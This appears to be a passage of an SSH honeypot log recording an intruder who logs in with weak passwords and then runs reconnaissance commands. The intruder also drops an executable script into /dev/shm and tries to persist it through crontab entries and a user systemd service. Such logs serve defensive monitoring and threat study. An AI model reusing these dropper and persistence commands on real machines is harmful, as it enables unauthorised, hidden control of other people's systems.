+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 16:04:50.000000 UTC] [1776701089_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 16:04:50.000500 UTC] [1776701089_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:50.200233 UTC] [1776701089_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 16:04:50.393528 UTC] [1776701089_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service' | exit_code=127 | stdout_bytes=0 | stderr_bytes=28
+
+[2026-04-20 16:04:50.393728 UTC] [1776701089_149.210.235.123_33300_sshshadow] [exec_stderr]
+exec.stderr
+sh: 1: systemctl: not found
+
+[2026-04-20 16:04:51.000000 UTC] [1776701091_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701091_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:51.000010 UTC] [1776701091_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:04:52.000000 UTC] [1776701091_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:52.000000 UTC] [1776701092_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701092_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:52.000010 UTC] [1776701092_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 16:04:52.000500 UTC] [1776701091_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:52.194353 UTC] [1776701091_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:04:52.399772 UTC] [1776701091_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10 | exit_code=0 | stdout_bytes=186 | stderr_bytes=0
+
+[2026-04-20 16:04:52.399872 UTC] [1776701091_149.210.235.123_33300_sshshadow] [exec_stdout]
+exec.stdout
+    PID %CPU COMMAND
+  22109 50.0 ps
+  22104 40.0 strace
+  21611  0.2 sshd
+    249  0.0 python3
+    248  0.0 sshd
+      1  0.0 bash
+  21614  0.0 sshd
+  22056  0.0 bash
+  22098  0.0 bash
+
+[2026-04-20 16:04:54.000000 UTC] [1776701092_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:04:54.000000 UTC] [1776701094_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701094_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:54.000010 UTC] [1776701094_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:54.000500 UTC] [1776701092_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:54.033606 UTC] [1776701092_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 16:04:54.268274 UTC] [1776701092_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=ps aux | grep astats | grep -v grep | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 16:04:54.268374 UTC] [1776701092_149.210.235.123_33300_sshshadow] [exec_stdout]
+exec.stdout
+0
+
+[2026-04-20 16:04:56.000000 UTC] [1776701094_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:04:56.000500 UTC] [1776701094_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:04:56.033697 UTC] [1776701094_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:04:56.212823 UTC] [1776701094_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:04:56.213023 UTC] [1776701094_149.210.235.123_33300_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:04:59.000000 UTC] [1776701099_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701099_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:04:59.000010 UTC] [1776701099_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:05:01.701430 UTC] [1776701099_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:05:02.000000 UTC] [1776701099_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:05:02.000500 UTC] [1776701099_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:02.539963 UTC] [1776701099_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:05:02.540164 UTC] [1776701099_149.210.235.123_33300_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:05:03.000000 UTC] [1776701103_149.210.235.123_33300_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701103_149.210.235.123_33300_sshshadow
+
+[2026-04-20 16:05:03.000010 UTC] [1776701103_149.210.235.123_33300_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:05:04.706773 UTC] [1776701103_149.210.235.123_33300_sshshadow] [command]
+ssh_exec | cwd=/home/ubuntu | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:05:04.856174 UTC] [1776701103_149.210.235.123_33300_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:05:04.856374 UTC] [1776701103_149.210.235.123_33300_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:05:05.000000 UTC] [1776701103_149.210.235.123_33300_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:05:05.000500 UTC] [1776701103_149.210.235.123_33300_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:47.767451 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:47826 | raw=Connection from 149.210.235.123 port 47826 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:05:47.864545 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:47830 | raw=Connection from 149.210.235.123 port 47830 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:05:48.000000 UTC] [1776701148_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701148_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:05:48.000010 UTC] [1776701148_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=uname -a
+
+[2026-04-20 16:05:48.334678 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:47826 | user=test | method=password | raw=Accepted password for test from 149.210.235.123 port 47826 ssh2
+
+[2026-04-20 16:05:49.827207 UTC] [1776701148_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=uname -a
+
+[2026-04-20 16:05:50.000000 UTC] [1776701148_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:05:50.000000 UTC] [1776701150_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701150_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:05:50.000010 UTC] [1776701150_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:05:50.000500 UTC] [1776701148_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:50.022444 UTC] [1776701148_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=uname -a | exit_code=0 | stdout_bytes=102 | stderr_bytes=0
+
+[2026-04-20 16:05:50.022543 UTC] [1776701148_149.210.235.123_47826_sshshadow] [exec_stdout]
+exec.stdout
+Linux gcs-shadow 6.17.0-1010-aws #10~24.04.1-Ubuntu SMP Thu Mar 19 01:45:25 UTC 2026 x86_64 GNU/Linux
+
+[2026-04-20 16:05:51.638770 UTC] [1776701150_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:05:51.700315 UTC] [1776701150_149.210.235.123_47826_sshshadow] [event]
+suspicious | detail=inline_exec:sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | severity=medium | action=observe
+
+[2026-04-20 16:05:51.790430 UTC] [1776701150_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done' | exit_code=0 | stdout_bytes=9 | stderr_bytes=0
+
+[2026-04-20 16:05:51.790529 UTC] [1776701150_149.210.235.123_47826_sshshadow] [exec_stdout]
+exec.stdout
+/dev/shm
+
+[2026-04-20 16:05:52.000000 UTC] [1776701150_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:05:52.000000 UTC] [1776701152_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701152_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:05:52.000010 UTC] [1776701152_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 16:05:52.000500 UTC] [1776701150_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:53.707996 UTC] [1776701152_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cat /proc/cpuinfo | grep processor | wc -l
+
+[2026-04-20 16:05:53.886951 UTC] [1776701152_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=cat /proc/cpuinfo | grep processor | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 16:05:53.887051 UTC] [1776701152_149.210.235.123_47826_sshshadow] [exec_stdout]
+exec.stdout
+2
+
+[2026-04-20 16:05:54.000000 UTC] [1776701152_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:05:54.000000 UTC] [1776701154_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701154_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:05:54.000010 UTC] [1776701154_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:05:54.000500 UTC] [1776701152_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:55.680225 UTC] [1776701154_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:05:55.751990 UTC] [1776701154_149.210.235.123_47826_sshshadow] [event]
+suspicious | detail=chmod_plus_x:cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | severity=medium | action=observe
+
+[2026-04-20 16:05:55.841656 UTC] [1776701154_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=cd "/dev/shm" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi | exit_code=0 | stdout_bytes=0 | stderr_bytes=0
+
+[2026-04-20 16:05:56.000000 UTC] [1776701154_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:05:56.000000 UTC] [1776701156_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701156_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:05:56.000010 UTC] [1776701156_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 16:05:56.000500 UTC] [1776701154_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:57.719775 UTC] [1776701156_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+
+[2026-04-20 16:05:57.922688 UTC] [1776701156_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=
+CRON="$(crontab -l 2>/dev/null || true)"
+echo "$CRON" | grep -F '/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"' >/dev/null 2>&1 || \
+  printf '%s\n%s\n' "@reboot  /dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"" "0 * * * * cd "/dev/shm" && ./w.sh "astats" "netai" "kstats" "ssh 2 ranges"" | (cat -; echo "$CRON") | crontab -
+ | exit_code=127 | stdout_bytes=0 | stderr_bytes=46
+
+[2026-04-20 16:05:57.922888 UTC] [1776701156_149.210.235.123_47826_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 4: crontab: command not found
+
+[2026-04-20 16:05:58.000000 UTC] [1776701156_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 16:05:58.000000 UTC] [1776701158_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701158_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:05:58.000010 UTC] [1776701158_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 16:05:58.000500 UTC] [1776701156_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:05:59.645609 UTC] [1776701158_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service'
+
+[2026-04-20 16:05:59.816659 UTC] [1776701158_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && systemctl --user daemon-reload && systemctl --user enable --now watcher-netai.service' | exit_code=127 | stdout_bytes=0 | stderr_bytes=28
+
+[2026-04-20 16:05:59.816859 UTC] [1776701158_149.210.235.123_47826_sshshadow] [exec_stderr]
+exec.stderr
+sh: 1: systemctl: not found
+
+[2026-04-20 16:06:00.000000 UTC] [1776701158_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=exit_code_127
+
+[2026-04-20 16:06:00.000000 UTC] [1776701160_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701160_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:06:00.000010 UTC] [1776701160_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:06:00.000500 UTC] [1776701158_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:06:01.768527 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:41352 | raw=Connection from 149.210.235.123 port 41352 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:06:01.840383 UTC] [-] [preauth]
+preauth:connect | src=149.210.235.123:41360 | raw=Connection from 149.210.235.123 port 41360 on 172.18.0.4 port 2222 rdomain ""
+
+[2026-04-20 16:06:02.737458 UTC] [-] [preauth]
+preauth:auth_success | src=149.210.235.123:41352 | user=admin | method=password | raw=Accepted password for admin from 149.210.235.123 port 41352 ssh2
+
+[2026-04-20 16:06:03.000000 UTC] [1776701163_149.210.235.123_41352_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776701163_149.210.235.123_41352_sshshadow
+
+[2026-04-20 16:06:03.000010 UTC] [1776701163_149.210.235.123_41352_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" 2>/dev/null && pwd && break; done'
+
+[2026-04-20 16:06:03.000020 UTC] [1776701163_149.210.235.123_41352_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 16:06:03.879648 UTC] [1776701160_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:06:04.000000 UTC] [1776701160_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:06:04.000000 UTC] [1776701164_149.210.235.123_41352_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776701164_149.210.235.123_41352_sshshadow
+
+[2026-04-20 16:06:04.000000 UTC] [1776701164_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701164_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:06:04.000010 UTC] [1776701164_149.210.235.123_41352_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
+
+[2026-04-20 16:06:04.000010 UTC] [1776701164_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 16:06:04.000020 UTC] [1776701164_149.210.235.123_41352_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 16:06:04.000500 UTC] [1776701160_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:06:04.129274 UTC] [1776701160_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10 | exit_code=0 | stdout_bytes=188 | stderr_bytes=0
+
+[2026-04-20 16:06:04.129374 UTC] [1776701160_149.210.235.123_47826_sshshadow] [exec_stdout]
+exec.stdout
+    PID %CPU COMMAND
+  22945 42.8 strace
+  22896  6.6 sshd
+  22899  1.5 sshd
+  22420  0.1 sshd
+    249  0.0 python3
+    248  0.0 sshd
+      1  0.0 bash
+  22423  0.0 sshd
+  22865  0.0 bash
+
+[2026-04-20 16:06:05.000000 UTC] [1776701165_149.210.235.123_41352_sshshadow] [session_start]
+session_start | mode=unknown | session_id=1776701165_149.210.235.123_41352_sshshadow
+
+[2026-04-20 16:06:05.000010 UTC] [1776701165_149.210.235.123_41352_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
+
+[2026-04-20 16:06:05.000020 UTC] [1776701165_149.210.235.123_41352_sshshadow] [note]
+note | commands.jsonl missing or empty; primary command was recovered from session.json: ssh_original_command
+
+[2026-04-20 16:06:05.920891 UTC] [1776701164_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=ps aux | grep astats | grep -v grep | wc -l
+
+[2026-04-20 16:06:06.000000 UTC] [1776701164_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=normal_exit
+
+[2026-04-20 16:06:06.000000 UTC] [1776701166_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701166_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:06:06.000010 UTC] [1776701166_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:06:06.000500 UTC] [1776701164_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:06:06.131853 UTC] [1776701164_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=ps aux | grep astats | grep -v grep | wc -l | exit_code=0 | stdout_bytes=2 | stderr_bytes=0
+
+[2026-04-20 16:06:06.131953 UTC] [1776701164_149.210.235.123_47826_sshshadow] [exec_stdout]
+exec.stdout
+0
+
+[2026-04-20 16:06:07.761532 UTC] [1776701166_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:06:07.929037 UTC] [1776701166_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:06:07.929237 UTC] [1776701166_149.210.235.123_47826_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:06:08.000000 UTC] [1776701166_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:06:08.000500 UTC] [1776701166_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:06:09.000000 UTC] [1776701169_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701169_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:06:09.000010 UTC] [1776701169_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:06:11.232691 UTC] [1776701169_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:06:11.385885 UTC] [1776701169_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:06:11.386085 UTC] [1776701169_149.210.235.123_47826_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
+[2026-04-20 16:06:12.000000 UTC] [1776701169_149.210.235.123_47826_sshshadow] [session_end]
+session_end | reason=exit_code_1
+
+[2026-04-20 16:06:12.000500 UTC] [1776701169_149.210.235.123_47826_sshshadow] [diff_summary]
+diff_summary
+{
+  "created": [],
+  "modified": [],
+  "deleted": [],
+  "counts": {
+    "created": 0,
+    "modified": 0,
+    "deleted": 0
+  }
+}
+
+[2026-04-20 16:06:13.000000 UTC] [1776701173_149.210.235.123_47826_sshshadow] [session_start]
+session_start | mode=non_interactive_exec | session_id=1776701173_149.210.235.123_47826_sshshadow
+
+[2026-04-20 16:06:13.000010 UTC] [1776701173_149.210.235.123_47826_sshshadow] [ssh_original_command]
+ssh_original_command | primary_command_source=session.json | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:06:14.631885 UTC] [1776701173_149.210.235.123_47826_sshshadow] [command]
+ssh_exec | cwd=/home/test | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats
+
+[2026-04-20 16:06:14.783766 UTC] [1776701173_149.210.235.123_47826_sshshadow] [event]
+ssh_exec_complete | cmd=cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats | exit_code=1 | stdout_bytes=0 | stderr_bytes=45
+
+[2026-04-20 16:06:14.783966 UTC] [1776701173_149.210.235.123_47826_sshshadow] [exec_stderr]
+exec.stderr
+/bin/bash: line 1: astats: Permission denied
+
